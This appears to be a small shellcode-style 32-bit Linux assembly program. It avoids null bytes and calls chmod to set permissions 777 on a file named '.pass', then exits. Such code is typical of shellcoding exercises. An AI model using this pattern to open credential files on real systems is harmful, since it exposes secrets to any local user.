section .text 
global _start 

_start: 
    xor eax, eax 
    xor ebx, ebx
    xor ecx, ecx
    mov al, 0xf
    push 0x73
    push 0x7361702E
    mov ebx,esp 
    mov cx, 777o
    int 0x80
    
    ; exit 
    xor eax, eax 
    mov al, 0x1
    int 0x80

section .data 

msg db  'test'

